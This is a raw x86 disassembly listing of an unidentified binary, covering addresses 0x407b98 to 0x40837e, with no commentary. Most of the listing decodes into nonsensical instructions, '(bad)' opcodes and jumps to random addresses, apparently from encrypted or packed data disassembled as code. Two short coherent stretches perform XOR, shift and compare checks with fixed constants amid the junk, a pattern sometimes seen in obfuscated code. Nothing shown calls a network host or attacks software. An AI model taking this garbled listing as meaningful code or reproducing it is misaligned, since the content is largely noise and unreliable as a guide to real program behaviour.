  407b98:	je     0x407b3e
  407b9a:	inc    ecx
  407b9b:	gs dec bp
  407b9e:	inc    ecx
  407b9f:	fwait
  407ba0:	xchg   ebp,eax
  407ba1:	retf   0x4458
  407ba4:	es add al,0x2c
  407ba7:	in     eax,0xb9
  407ba9:	shl    DWORD PTR [ebx+ebp*1-0x31],0xbf
  407bae:	jbe    0x407bb6
  407bb0:	xor    eax,0x2bbd242c
  407bb5:	fimul  WORD PTR [esi-0x5de6cf8c]
  407bbb:	rcr    BYTE PTR [ecx+0x538ef845],0xd4
  407bc2:	cmc    
  407bc3:	inc    esp
  407bc4:	sub    BYTE PTR [esi+edi*1],bh
  407bc7:	outs   dx,DWORD PTR ds:[esi]
  407bc8:	lock xlat BYTE PTR ds:[ebx]
  407bca:	sub    al,0x64
  407bcc:	(bad)  
  407bcd:	sub    al,0x84
  407bcf:	dec    edi
  407bd0:	test   DWORD PTR [eax-0x16],esi
  407bd3:	js     0x407b67
  407bd5:	inc    ebx
  407bd6:	shl    DWORD PTR [eax+0x4b3a5f14],1
  407bdc:	and    WORD PTR [edi+0x13],cx
  407be0:	and    BYTE PTR [ecx-0x441693f5],0xb5
  407be7:	outs   dx,BYTE PTR ds:[esi]
  407be8:	int3   
  407be9:	xchg   ecx,eax
  407bea:	daa    
  407beb:	sbb    DWORD PTR [edx-0x39],ebp
  407bee:	jno    0x407bf8
  407bf0:	pop    edx
  407bf1:	sbb    BYTE PTR [ebp+0x6554a943],dl
  407bf7:	jne    0x407c58
  407bf9:	lds    ebx,FWORD PTR [edi]
  407bfb:	cmp    DWORD PTR [eax-0x3d2f1d7c],edx
  407c01:	xor    ch,dl
  407c03:	xchg   BYTE PTR [esp+edx*2],ah
  407c06:	out    0xe6,al
  407c08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c09:	in     al,0xe7
  407c0b:	in     al,0xc
  407c0d:	scas   al,BYTE PTR es:[edi]
  407c0e:	mov    al,0xc8
  407c10:	fyl2x  
  407c12:	ret    0x32d5
  407c15:	cmp    bl,BYTE PTR [eax+0x2ccb0f44]
  407c1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c1c:	out    dx,al
  407c1d:	mul    DWORD PTR [ebx+ebx*8-0x5d]
  407c21:	pop    eax
  407c22:	loopne 0x407bdf
  407c24:	or     dl,BYTE PTR [eax-0x7d]
  407c27:	sar    ch,1
  407c29:	repz repnz icebp 
  407c2c:	nop
  407c2d:	cmp    ebx,esi
  407c2f:	pushf  
  407c30:	jecxz  0x407c7f
  407c32:	push   edi
  407c33:	jbe    0x407bbe
  407c35:	jae    0x407c53
  407c37:	and    BYTE PTR [eax],0xf0
  407c3a:	and    al,0x9b
  407c3c:	test   BYTE PTR [edi+0x4c],al
  407c3f:	stos   BYTE PTR es:[edi],al
  407c40:	clc    
  407c41:	push   esi
  407c42:	and    ebp,DWORD PTR [edi]
  407c44:	cmp    bh,ch
  407c46:	xor    DWORD PTR [esi],esi
  407c48:	sub    ch,0xcf
  407c4b:	inc    esi
  407c4c:	cdq    
  407c4d:	mov    DWORD PTR [esi+0x73827f72],ebx
  407c53:	push   ds
  407c54:	push   0x43
  407c56:	push   esi
  407c57:	adc    al,0x79
  407c59:	rol    DWORD PTR [esi-0x3081487e],0x3a
  407c60:	retf   0xb8be
  407c63:	fwait
  407c64:	or     DWORD PTR [ecx-0x30347170],ebx
  407c6a:	mov    esp,0x6421d612
  407c6f:	(bad)  
  407c70:	outs   dx,DWORD PTR ds:[esi]
  407c71:	fstp   DWORD PTR [edx]
  407c73:	push   esp
  407c74:	fistp  QWORD PTR [edx]
  407c76:	dec    eax
  407c77:	test   eax,0x8427e158
  407c7c:	jg     0x407cb2
  407c7e:	fld    QWORD PTR [edx+0x5]
  407c81:	xor    BYTE PTR [ecx-0x2b],0x65
  407c85:	idiv   BYTE PTR [edi-0x5e]
  407c88:	aas    
  407c89:	mov    edx,0x279f5bdd
  407c8e:	inc    ecx
  407c8f:	mov    cl,0xf9
  407c91:	lods   al,BYTE PTR ds:[esi]
  407c92:	iret   
  407c93:	and    edx,DWORD PTR [esi-0x1a87daf1]
  407c99:	jmp    0xf2b2a17e
  407c9e:	dec    eax
  407c9f:	cmp    bh,BYTE PTR [edi-0x5c]
  407ca2:	(bad)  [edx-0x73]
  407ca5:	push   edx
  407ca6:	daa    
  407ca7:	push   es
  407ca8:	cdq    
  407ca9:	adc    ah,BYTE PTR [esi]
  407cab:	hlt    
  407cac:	adc    al,cl
  407cae:	mov    fs,WORD PTR [ebx-0x17fa44bf]
  407cb4:	cmp    ebx,DWORD PTR [esi]
  407cb6:	jo     0x407d20
  407cb8:	outs   dx,DWORD PTR ds:[esi]
  407cb9:	mov    cl,0x51
  407cbb:	push   0x304f2a89
  407cc0:	inc    ebp
  407cc1:	xor    BYTE PTR [edx],al
  407cc3:	arpl   WORD PTR [edi-0x28f1938a],sp
  407cc9:	clc    
  407cca:	shr    DWORD PTR [eax+0x73],1
  407ccd:	fnstenv [edi]
  407ccf:	sub    al,0xed
  407cd1:	xchg   ebp,eax
  407cd2:	jmp    0xc1dd:0xe250b0f2
  407cd9:	dec    ecx
  407cda:	imul   esi,DWORD PTR [esi+0x66],0x73
  407cde:	xchg   esp,eax
  407cdf:	xlat   BYTE PTR ds:[ebx]
  407ce0:	push   ebx
  407ce1:	enter  0x5ab5,0x53
  407ce5:	sysret 
  407ce7:	pop    esp
  407ce8:	inc    ebp
  407ce9:	popf   
  407cea:	lods   al,BYTE PTR ds:[esi]
  407ceb:	addr16 mov edx,0x5c7be57d
  407cf1:	fimul  DWORD PTR [edx+eax*8-0x497666dc]
  407cf8:	ins    DWORD PTR es:[edi],dx
  407cf9:	clc    
  407cfa:	in     eax,0x23
  407cfc:	cli    
  407cfd:	bnd je 0x407d57
  407d00:	jecxz  0x407cf8
  407d02:	inc    eax
  407d03:	sbb    eax,0xbd98951d
  407d08:	add    ecx,esi
  407d0a:	inc    ebp
  407d0b:	and    BYTE PTR [ecx],al
  407d0d:	xchg   esp,eax
  407d0e:	sbb    ebp,DWORD PTR [ecx]
  407d10:	adc    al,0x7c
  407d12:	retf   0x9cea
  407d15:	lods   al,BYTE PTR ds:[esi]
  407d16:	ins    BYTE PTR es:[edi],dx
  407d17:	stos   BYTE PTR es:[edi],al
  407d18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d19:	dec    esp
  407d1a:	into   
  407d1b:	cli    
  407d1c:	ror    BYTE PTR [esi+ebx*4],1
  407d1f:	xchg   ebp,eax
  407d20:	cmc    
  407d21:	scas   eax,DWORD PTR es:[edi]
  407d22:	inc    esp
  407d23:	and    al,0xfe
  407d25:	jmp    DWORD PTR [edi-0x5c]
  407d28:	dec    ebx
  407d29:	scas   al,BYTE PTR es:[edi]
  407d2a:	jmp    0x407d90
  407d2c:	adc    dl,BYTE PTR [ebx+0x1c1a9fa2]
  407d32:	loopne 0x407d77
  407d34:	call   0xb680:0x4feb654c
  407d3b:	pushf  
  407d3c:	xor    eax,DWORD PTR [edx-0x7c13b0d3]
  407d42:	cmp    DWORD PTR [ebp-0x36],0x6e
  407d46:	pop    ecx
  407d47:	fild   QWORD PTR fs:[ecx+0x24]
  407d4b:	add    eax,0x4c1e5504
  407d50:	outs   dx,BYTE PTR ds:[esi]
  407d51:	iret   
  407d52:	xchg   ebp,eax
  407d53:	ss sbb edx,ebp
  407d56:	mov    ds:0x23afab7d,eax
  407d5b:	(bad)  
  407d5c:	jecxz  0x407d74
  407d5e:	dec    eax
  407d5f:	mov    ds:0x6e576a38,al
  407d64:	bound  esp,QWORD PTR [eax+0x4c]
  407d67:	mov    ebx,0x5e1215ad
  407d6c:	call   0x65c09ee8
  407d71:	pop    eax
  407d72:	push   ecx
  407d73:	push   0xffffffdc
  407d75:	add    dh,BYTE PTR [ebx+0x61]
  407d78:	sti    
  407d79:	bound  esp,QWORD PTR [eax+0x73e48458]
  407d7f:	mov    bh,dl
  407d81:	cmp    eax,0xfde4ddc0
  407d86:	mov    al,bh
  407d88:	es ret 
  407d8a:	ds push esi
  407d8c:	jecxz  0x407dfb
  407d8e:	out    dx,eax
  407d8f:	adc    al,ah
  407d91:	or     ebp,edx
  407d93:	test   al,0x10
  407d95:	mov    eax,0xcfc90ebc
  407d9a:	lods   al,BYTE PTR ds:[esi]
  407d9b:	ins    DWORD PTR es:[edi],dx
  407d9c:	lock sub eax,edx
  407d9f:	neg    BYTE PTR [eax-0x2e]
  407da2:	inc    edx
  407da3:	xor    al,0x2b
  407da5:	mov    bl,0xd3
  407da7:	inc    esp
  407da8:	add    BYTE PTR [ebp+0xd6abe75],0xd1
  407daf:	ret    
  407db0:	push   ds
  407db1:	and    ebp,eax
  407db3:	mov    al,0x1f
  407db5:	aas    
  407db6:	or     BYTE PTR [ebp+0x21],cl
  407db9:	ds jecxz 0x407e28
  407dbc:	ror    dl,0x9c
  407dbf:	mov    DWORD PTR [ebx-0x33b2743f],ecx
  407dc5:	shrd   ecx,eax,0x2
  407dc9:	shl    edx,0x1e
  407dcc:	xor    edx,0x40000000
  407dd2:	or     edx,DWORD PTR [ebp-0x64]
  407dd5:	mov    DWORD PTR [ebp-0x30],ecx
  407dd8:	mov    ecx,DWORD PTR [esi]
  407dda:	mov    DWORD PTR [ebp-0x5c],ecx
  407ddd:	shl    DWORD PTR [ebp-0x5c],0x1e
  407de1:	xor    DWORD PTR [ebp-0x5c],0x40000000
  407de8:	mov    DWORD PTR [ebp-0x6c],edx
  407deb:	mov    edx,DWORD PTR [esi+0x4]
  407dee:	mov    edx,DWORD PTR [ebp-0x5c]
  407df1:	xor    ecx,ecx
  407df3:	or     ecx,DWORD PTR [ebp-0x30]
  407df6:	shr    eax,0x2
  407df9:	or     edx,eax
  407dfb:	cmp    ecx,DWORD PTR [ebp-0x70]
  407dfe:	jne    0x4071b0
  407e04:	cmp    edx,DWORD PTR [ebp-0x6c]
  407e07:	je     0x40a9b0
  407e0d:	jmp    0x4071b0
  407e12:	mov    ecx,DWORD PTR [ebx]
  407e14:	mov    eax,DWORD PTR [ebx+0x4]
  407e17:	xor    eax,0x9c1b89e8
  407e1c:	xor    ecx,0xca79a577
  407e22:	shrd   ecx,eax,0x2
  407e26:	shr    eax,0x2
  407e29:	mov    DWORD PTR [ebp-0x6c],eax
  407e2c:	mov    eax,DWORD PTR [ebx]
  407e2e:	mov    edx,DWORD PTR [ebx+0x4]
  407e31:	mov    edx,eax
  407e33:	xor    eax,eax
  407e35:	or     eax,ecx
  407e37:	shl    edx,0x1e
  407e3a:	xor    edx,0x40000000
  407e40:	or     edx,DWORD PTR [ebp-0x6c]
  407e43:	mov    DWORD PTR [ebp-0x68],eax
  407e46:	mov    eax,DWORD PTR [esi]
  407e48:	xor    eax,0xca79a577
  407e4d:	mov    DWORD PTR [ebp+0x14],eax
  407e50:	mov    DWORD PTR [ebp-0x64],edx
  407e53:	mov    edx,DWORD PTR [esi+0x4]
  407e56:	mov    ecx,0x9c1b89e8
  407e5b:	xor    edx,ecx
  407e5d:	mov    eax,edx
  407e5f:	mov    edx,DWORD PTR [ebp+0x14]
  407e62:	shrd   edx,eax,0x2
  407e66:	shr    eax,0x2
  407e69:	jmp    0x408247
  407e6e:	push   ss
  407e6f:	dec    esi
  407e70:	dec    ecx
  407e71:	test   BYTE PTR [eax-0x22],0x27
  407e75:	cs aam 0xd8
  407e78:	sbb    eax,0xa509777e
  407e7d:	mov    esp,0x18186f22
  407e82:	sahf   
  407e83:	adc    bl,BYTE PTR [eax]
  407e85:	sbb    BYTE PTR [eax-0x66],cl
  407e88:	inc    eax
  407e89:	loope  0x407e0d
  407e8b:	jb     0x407e9e
  407e8d:	cmp    dh,BYTE PTR [ebp-0x29]
  407e90:	xor    eax,0x257277d
  407e95:	hlt    
  407e96:	ret    0x5a35
  407e99:	test   al,0x38
  407e9b:	stos   BYTE PTR es:[edi],al
  407e9c:	popf   
  407e9d:	mov    cl,0x6b
  407e9f:	pushf  
  407ea0:	ret    0xb107
  407ea3:	mov    cl,0x1b
  407ea5:	std    
  407ea6:	xchg   edi,eax
  407ea7:	inc    esp
  407ea8:	sbb    ebx,DWORD PTR [esi+0x1d32e1bc]
  407eae:	ja     0x407e34
  407eb0:	dec    ebp
  407eb1:	lods   al,BYTE PTR ds:[esi]
  407eb2:	sbb    DWORD PTR ds:0x18bf192f,esp
  407eb8:	jno    0x407f03
  407eba:	jp     0x407e5b
  407ebc:	aad    0xc
  407ebe:	das    
  407ebf:	sbb    BYTE PTR [eax+0x26],dl
  407ec2:	add    edi,ebp
  407ec4:	jmp    0x407ef6
  407ec6:	sbb    al,0x6f
  407ec8:	pop    eax
  407ec9:	pop    edi
  407eca:	scas   eax,DWORD PTR es:[edi]
  407ecb:	mov    bl,0x21
  407ecd:	cmc    
  407ece:	jnp    0x407eeb
  407ed0:	das    
  407ed1:	fidivr DWORD PTR [edx]
  407ed3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ed4:	mov    ds:0x3a8f8901,al
  407ed9:	jle    0x407e89
  407edb:	bnd jmp 0x407f10
  407ede:	push   eax
  407edf:	dec    ebx
  407ee0:	pop    esp
  407ee1:	imul   edi,DWORD PTR [ebx+0x6a],0x8e24afc6
  407ee8:	xchg   DWORD PTR [ebp+0x3d],ecx
  407eeb:	imul   eax,DWORD PTR [ebp+0x1aef599e],0x37
  407ef2:	out    0x95,eax
  407ef4:	mov    bh,0xbe
  407ef6:	pop    eax
  407ef7:	add    ch,0x4d
  407efa:	fucomip st,st(6)
  407efc:	xor    eax,0xf60360c9
  407f01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f02:	jmp    0xe775:0xac9d3a5b
  407f09:	adc    eax,0x61e99c11
  407f0e:	into   
  407f0f:	int    0xb7
  407f11:	pop    edx
  407f12:	mov    ch,0xf4
  407f14:	xchg   ebp,eax
  407f15:	into   
  407f16:	out    dx,eax
  407f17:	lea    ecx,[ebx+0x302d476]
  407f1d:	pushf  
  407f1e:	mov    BYTE PTR [eax+0x7708437f],ch
  407f24:	and    esp,eax
  407f26:	add    eax,0x9d09bb86
  407f2b:	inc    esi
  407f2c:	pop    ebx
  407f2d:	fmul   st,st(0)
  407f2f:	add    eax,0x1056a6a0
  407f34:	xchg   esp,eax
  407f35:	mov    al,0x97
  407f37:	pusha  
  407f38:	inc    eax
  407f3a:	push   ds
  407f3b:	pop    edx
  407f3c:	int3   
  407f3d:	xchg   BYTE PTR [eax+0x55f14c81],al
  407f43:	push   ss
  407f44:	in     al,0xf3
  407f46:	inc    ecx
  407f47:	ret    0xf5b2
  407f4a:	inc    edx
  407f4b:	jp     0x407f6d
  407f4d:	add    al,0xf6
  407f4f:	dec    edx
  407f50:	lahf   
  407f51:	mov    ebx,0x592fffd0
  407f56:	into   
  407f57:	and    DWORD PTR [ecx+0x5a531dff],0xffffffcf
  407f5e:	cli    
  407f5f:	rol    BYTE PTR [esp+eiz*2+0x28],0xbd
  407f64:	ds adc al,0x2e
  407f67:	into   
  407f68:	mov    ds:0x6dfead5e,eax
  407f6e:	jecxz  0x407f6f
  407f70:	xchg   ebx,eax
  407f71:	push   ss
  407f72:	xor    ah,ah
  407f74:	jne    0x407f79
  407f76:	adc    ecx,DWORD PTR [edx]
  407f78:	scas   eax,DWORD PTR es:[edi]
  407f79:	mov    ah,0x30
  407f7b:	mov    ch,0x4f
  407f7d:	dec    ebx
  407f7e:	pop    ss
  407f7f:	xchg   ecx,eax
  407f80:	loopne 0x407fad
  407f82:	add    BYTE PTR [ebp+0x6d4fe6d2],ah
  407f88:	inc    esi
  407f89:	cmp    eax,0xc58358b
  407f8e:	fist   DWORD PTR [edx]
  407f90:	(bad)  
  407f91:	push   0xc795c34a
  407f96:	mov    al,BYTE PTR ds:0x68d94572
  407f9c:	mov    esi,0xa9c3ded5
  407fa1:	sub    ch,dh
  407fa3:	mov    ?,WORD PTR [esi+0x6cea6e50]
  407fa9:	inc    ecx
  407faa:	jle    0x407f96
  407fac:	xchg   edi,eax
  407fad:	aaa    
  407fae:	mov    eax,0x708fe690
  407fb3:	xchg   ebp,eax
  407fb4:	mov    dl,0xc4
  407fb6:	div    DWORD PTR [ebx-0x9]
  407fb9:	les    eax,FWORD PTR [ecx-0x42a56a21]
  407fbf:	dec    edx
  407fc0:	jl     0x408024
  407fc2:	pop    ds
  407fc3:	mov    ss,WORD PTR [ebp+0x3dd26629]
  407fc9:	add    eax,0xa06939f6
  407fce:	ret    0xec8a
  407fd1:	push   esp
  407fd2:	ficomp WORD PTR [edi-0x210141fc]
  407fd8:	or     BYTE PTR [ecx],bh
  407fda:	(bad)  [edx-0x22]
  407fdd:	ja     0x407ff9
  407fdf:	inc    ecx
  407fe0:	cmp    DWORD PTR [esi],0x8cfdb51a
  407fe6:	stos   BYTE PTR es:[edi],al
  407fe7:	int3   
  407fe8:	or     BYTE PTR [ecx],ah
  407fea:	mov    cs,WORD PTR [ebx]
  407fec:	mov    edx,0x5cdb629f
  407ff1:	push   0xc3e8d33f
  407ff6:	ss jb  0x407f87
  407ff9:	xor    al,0xc2
  407ffb:	and    edi,DWORD PTR [esi+0xf]
  407ffe:	xchg   edx,eax
  407fff:	in     eax,0xc5
  408001:	xchg   edx,eax
  408002:	pushf  
  408003:	loopne 0x408023
  408005:	dec    esp
  408006:	imul   eax,DWORD PTR [eax+0x99ac2da],0x685fe108
  408010:	adc    al,ch
  408012:	js     0x407fd8
  408014:	jnp    0x407fcd
  408016:	(bad)  
  408017:	adc    BYTE PTR [eax-0x54ca0aa5],al
  40801d:	jae    0x408090
  40801f:	rol    DWORD PTR [esi-0x3d2343bc],0x39
  408026:	int3   
  408027:	or     al,0xfc
  408029:	outs   dx,BYTE PTR ds:[esi]
  40802a:	jecxz  0x408032
  40802c:	enter  0x9df1,0x16
  408030:	mov    eax,ds:0x8198217a
  408035:	test   bh,dh
  408037:	mov    ah,0xbb
  408039:	retf   
  40803a:	fistp  QWORD PTR [ebp-0xb]
  40803d:	icebp  
  40803e:	jns    0x408034
  408040:	rol    ah,1
  408042:	jne    0x40807f
  408044:	push   0xffffffb1
  408046:	sub    al,0xf2
  408048:	mov    al,0x10
  40804a:	pop    edi
  40804b:	pop    ecx
  40804c:	or     BYTE PTR [edx-0x18071b97],ah
  408052:	repnz xor eax,0xec2255c3
  408058:	aad    0xb6
  40805a:	push   cs
  40805b:	push   esi
  40805c:	mov    ebp,0x45a27e1
  408061:	xchg   ebx,eax
  408062:	pop    ebp
  408063:	jae    0x4080b0
  408065:	jl     0x4080d3
  408067:	ds ret 
  408069:	jl     0x4080bb
  40806b:	jge    0x40806a
  40806d:	jg     0x4080d4
  40806f:	xor    DWORD PTR [ecx-0x99f1803],esi
  408075:	ds jg  0x4080c5
  408078:	xor    BYTE PTR [ebp-0x6e],al
  40807b:	jp     0x4080ea
  40807d:	imul   eax,DWORD PTR [eax*8+0x6c6d54d9],0x1a
  408085:	mov    ecx,0xef193df4
  40808a:	xor    BYTE PTR [ebx],bl
  40808c:	in     al,dx
  40808d:	push   0xffffff98
  40808f:	pusha  
  408090:	test   al,0x95
  408092:	ret    
  408093:	and    esi,DWORD PTR [eax+0x3e670cec]
  408099:	test   ch,ah
  40809b:	stos   BYTE PTR es:[edi],al
  40809c:	lds    ebx,FWORD PTR [eax-0x17ef5b86]
  4080a2:	cli    
  4080a3:	ds (bad) 
  4080a5:	aam    0x9
  4080a7:	(bad)  
  4080a9:	jmp    0x6534799f
  4080ae:	mov    ds:0xc1ac52dd,eax
  4080b3:	push   edx
  4080b4:	xor    ah,BYTE PTR [ebp+edx*4-0x11cba0b]
  4080bb:	hlt    
  4080bc:	jo     0x408099
  4080be:	test   eax,0x8873ae75
  4080c3:	pop    ecx
  4080c4:	idiv   edi
  4080c6:	aad    0xba
  4080c8:	cmp    BYTE PTR [esi+0x5e3aecc0],dh
  4080ce:	xchg   edx,eax
  4080cf:	enter  0x2165,0x48
  4080d3:	sub    eax,0x75b4aa4a
  4080d8:	mov    edi,DWORD PTR [ecx+0x7df29bc]
  4080de:	neg    BYTE PTR [ebx]
  4080e0:	inc    esi
  4080e1:	icebp  
  4080e2:	sbb    eax,0xfc0c9b7d
  4080e7:	in     eax,dx
  4080e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080e9:	outs   dx,DWORD PTR ds:[esi]
  4080ea:	jl     0x40811b
  4080ec:	lahf   
  4080ed:	ins    BYTE PTR es:[edi],dx
  4080ee:	mov    eax,esp
  4080f0:	mov    cl,0x81
  4080f2:	loop   0x408140
  4080f4:	pop    es
  4080f5:	cmp    al,BYTE PTR [ecx]
  4080f7:	ffree  st(1)
  4080f9:	les    eax,FWORD PTR [edx-0x1d62c0ba]
  4080ff:	push   ecx
  408100:	jl     0x408091
  408102:	jp     0x4080a6
  408104:	inc    ebx
  408105:	push   esi
  408106:	adc    eax,esi
  408108:	sbb    BYTE PTR [eax+0xa],0xdf
  40810c:	cmc    
  40810d:	sbb    eax,0xbc80d6e5
  408112:	sub    cl,bh
  408114:	loope  0x4080fc
  408116:	mov    eax,0xb9b9a43c
  40811b:	push   ss
  40811c:	aad    0xf8
  40811e:	cmp    esi,DWORD PTR [eax]
  408120:	cmp    eax,0x4f048a5a
  408125:	jmp    0x408136
  408127:	fcomp  DWORD PTR [edx]
  408129:	gs xchg esi,esi
  40812c:	aas    
  40812d:	sub    ah,BYTE PTR [edx+edx*1-0x4e]
  408131:	test   BYTE PTR gs:[eax+0x182a8b90],cl
  408138:	shl    DWORD PTR [ecx-0x55],0x50
  40813c:	mov    ds,ebp
  40813e:	xor    al,0xfb
  408140:	xor    edi,DWORD PTR [eax]
  408142:	test   eax,0x72ec1266
  408147:	jg     0x408148
  408149:	les    edi,FWORD PTR [ebx-0x7c]
  40814c:	jno    0x408154
  40814e:	dec    eax
  40814f:	pop    ds
  408150:	leave  
  408151:	cmp    eax,0x98d9a1da
  408156:	mov    bl,0x3d
  408158:	jno    0x4081cd
  40815a:	jne    0x4081a4
  40815c:	and    BYTE PTR [ecx+0x308715a6],cl
  408162:	sbb    esi,DWORD PTR [edx-0x5a]
  408165:	xor    bh,BYTE PTR [ecx-0x198fc665]
  40816b:	xor    bl,BYTE PTR [eax+0x3b]
  40816e:	imul   ebp,edi,0xffffffc7
  408171:	imul   edx,esp,0xffffffbe
  408174:	ja     0x408133
  408176:	(bad)
  408179:	(bad)  
  40817a:	fild   WORD PTR [esi-0xcaa7d4b]
  408180:	add    al,0x45
  408182:	(bad)  
  408183:	jae    0x408147
  408185:	pusha  
  408186:	jge    0x40817f
  408188:	sub    al,0xa8
  40818a:	xor    bh,BYTE PTR ds:0xdf33d7d6
  408190:	popf   
  408191:	mov    dh,0xb7
  408193:	les    esp,FWORD PTR [ebp-0x4c]
  408196:	mov    ds:0xe4f6405,al
  40819b:	dec    ecx
  40819c:	jnp    0x408192
  40819e:	ins    DWORD PTR es:[edi],dx
  40819f:	push   cs
  4081a0:	jo     0x408171
  4081a2:	inc    ebx
  4081a3:	fs jg  0x408166
  4081a6:	xor    BYTE PTR ds:0x8dc03b9,0x6
  4081ad:	inc    ecx
  4081ae:	mov    esi,DWORD PTR [edi-0x3d]
  4081b1:	mov    al,ds:0xc409035d
  4081b6:	(bad)  
  4081b7:	loopne 0x4081be
  4081b9:	arpl   bx,bx
  4081bb:	or     al,0x77
  4081bd:	js     0x40818b
  4081bf:	mov    esp,0x208017de
  4081c4:	sub    BYTE PTR [ebp+0x79],0x55
  4081c8:	ret    0x48f7
  4081cb:	dec    esi
  4081cc:	or     al,0xa2
  4081ce:	(bad)  
  4081cf:	retf   
  4081d0:	lahf   
  4081d1:	out    0x29,al
  4081d3:	or     dl,BYTE PTR [edi]
  4081d5:	dec    esp
  4081d6:	mov    ebx,0x93a51854
  4081db:	and    DWORD PTR [edi+0x3e31924c],0xf1f0bd30
  4081e5:	mov    cs,WORD PTR [ebp+0x7ca245be]
  4081eb:	pop    ss
  4081ec:	push   ds
  4081ed:	mov    esp,eax
  4081ef:	and    DWORD PTR [eax-0x78],0x7b7d6460
  4081f6:	int    0x4
  4081f8:	call   0x7e50d9b0
  4081fd:	mov    edi,DWORD PTR [esi-0x2d]
  408200:	dec    esp
  408201:	inc    ecx
  408202:	mov    bh,0x32
  408204:	cmp    ebp,ecx
  408206:	lahf   
  408207:	push   esp
  408208:	(bad)  
  408209:	pusha  
  40820a:	add    bl,al
  40820c:	push   cs
  40820d:	into   
  40820e:	inc    ecx
  40820f:	pop    ecx
  408210:	in     al,dx
  408211:	sub    BYTE PTR [edi],ah
  408213:	mov    bh,dh
  408215:	sbb    BYTE PTR [esi+0x5bfae284],bh
  40821b:	call   0x7c9b:0xe5be18df
  408222:	xchg   ebx,eax
  408223:	or     al,dl
  408225:	jmp    0x4081df
  408227:	mov    ebp,0xfd0714db
  40822c:	xchg   edx,eax
  40822d:	xor    DWORD PTR [ecx],edi
  40822f:	int3   
  408230:	call   0xa058e689
  408235:	imul   ecx,edi,0x9ae44003
  40823b:	push   edx
  40823c:	dec    esp
  40823d:	call   0xc368:0x3bd54852
  408244:	jl     0x40826e
  408246:	xchg   ebx,eax
  408247:	mov    DWORD PTR [ebp-0x6c],eax
  40824a:	mov    eax,DWORD PTR [esi]
  40824c:	mov    DWORD PTR [ebp+0x14],eax
  40824f:	shl    DWORD PTR [ebp+0x14],0x1e
  408253:	xor    DWORD PTR [ebp+0x14],0x40000000
  40825a:	xor    eax,eax
  40825c:	mov    DWORD PTR [ebp-0x70],edx
  40825f:	or     eax,DWORD PTR [ebp-0x70]
  408262:	mov    edx,DWORD PTR [esi+0x4]
  408265:	mov    DWORD PTR [ebp-0x60],eax
  408268:	mov    eax,DWORD PTR [ebp+0x14]
  40826b:	or     eax,DWORD PTR [ebp-0x6c]
  40826e:	mov    DWORD PTR [ebp-0x5c],eax
  408271:	mov    eax,DWORD PTR [ebp-0x68]
  408274:	cmp    DWORD PTR [ebp-0x60],eax
  408277:	jmp    0x408655
  40827c:	xchg   edx,eax
  40827d:	hlt    
  40827e:	xchg   ebp,eax
  40827f:	addr16 jb 0x4082e9
  408282:	(bad)  
  408283:	in     al,0x70
  408285:	mov    edx,0x393a709d
  40828a:	lods   eax,DWORD PTR ds:[esi]
  40828b:	mov    al,0xa8
  40828d:	sbb    BYTE PTR [bx+si],bl
  408290:	sahf   
  408291:	adc    bl,BYTE PTR [eax]
  408293:	sbb    al,bh
  408295:	pop    edi
  408296:	pop    edx
  408297:	xor    DWORD PTR [ebp+0x4f84da0f],esi
  40829d:	or     edx,esi
  40829f:	dec    ecx
  4082a0:	xchg   ecx,eax
  4082a1:	ja     0x4082a8
  4082a3:	cwde   
  4082a4:	mov    cl,0xb2
  4082a6:	fs jmp 0xe828c4b1
  4082ac:	call   0x6cda:0x45189239
  4082b3:	or     al,0x9e
  4082b5:	pop    ss
  4082b6:	shr    DWORD PTR [edi],1
  4082b8:	jnp    0x4082fe
  4082ba:	xchg   edx,eax
  4082bb:	push   esi
  4082bc:	call   FWORD PTR [eax-0x2faa83af]
  4082c2:	pop    esp
  4082c3:	les    edi,FWORD PTR [edx-0x23]
  4082c6:	and    dh,BYTE PTR [eax-0x78681b80]
  4082cc:	add    DWORD PTR [edx-0x1aba3566],0x7a
  4082d3:	ret    
  4082d4:	imul   ebx,DWORD PTR [ecx],0xc6ca7b1f
  4082da:	ret    
  4082db:	jge    0x408273
  4082dd:	sbb    DWORD PTR [edx+0x62],0x35516e29
  4082e4:	mov    ds:0x85749eec,al
  4082e9:	sbb    bh,cl
  4082eb:	sbb    ecx,DWORD PTR [edi+0x9ab3546]
  4082f1:	test   eax,0x49fbd03d
  4082f6:	jae    0x408360
  4082f8:	pop    edi
  4082f9:	fiadd  DWORD PTR [eax]
  4082fb:	out    dx,al
  4082fc:	jo     0x40834e
  4082fe:	jle    0x408310
  408300:	adc    eax,DWORD PTR [esi+0x70f0e7d0]
  408306:	repz retf 0x9513
  40830a:	dec    esi
  40830b:	lds    ecx,FWORD PTR [edx-0x60497c01]
  408311:	inc    esp
  408312:	pop    ebx
  408313:	(bad)  
  408314:	sub    al,0xca
  408316:	fwait
  408317:	out    0x39,al
  408319:	add    ecx,DWORD PTR [eax+0x8]
  40831c:	xor    esp,DWORD PTR [edx+0x6a]
  40831f:	pop    ss
  408320:	int    0x89
  408322:	add    DWORD PTR [ecx+0x53],eax
  408325:	cli    
  408326:	test   BYTE PTR ds:0x70920ce2,ch
  40832c:	js     0x4082b5
  40832e:	shl    DWORD PTR [esi],0x6b
  408331:	add    DWORD PTR [edi],edx
  408333:	lahf   
  408334:	add    ecx,DWORD PTR [eax+0x60]
  408337:	int3   
  408338:	sub    DWORD PTR [edi],eax
  40833a:	call   0x663624be
  40833f:	in     eax,0x88
  408341:	into   
  408342:	adc    eax,ebp
  408344:	dec    esp
  408345:	(bad)  
  408346:	cmp    al,0x89
  408348:	xor    dl,dl
  40834a:	mov    edx,0x40b2e692
  40834f:	scas   al,BYTE PTR es:[edi]
  408350:	icebp  
  408351:	mov    esi,0x91e95a27
  408356:	add    BYTE PTR [esi+0x10],dl
  408359:	lods   al,BYTE PTR ds:[esi]
  40835a:	jbe    0x40833d
  40835c:	sbb    dh,cl
  40835e:	add    dl,BYTE PTR [ebx+0x44d4a9b6]
  408364:	or     eax,0x8ed41474
  408369:	call   0x294c:0xf71ad724
  408370:	dec    ebp
  408371:	adc    al,BYTE PTR [edx]
  408373:	js     0x4083b8
  408375:	out    0x3a,al
  408377:	cmp    bh,bl
  408379:	and    edx,eax
  40837b:	mov    ah,0x1a
  40837d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40837e:	inc    ecx
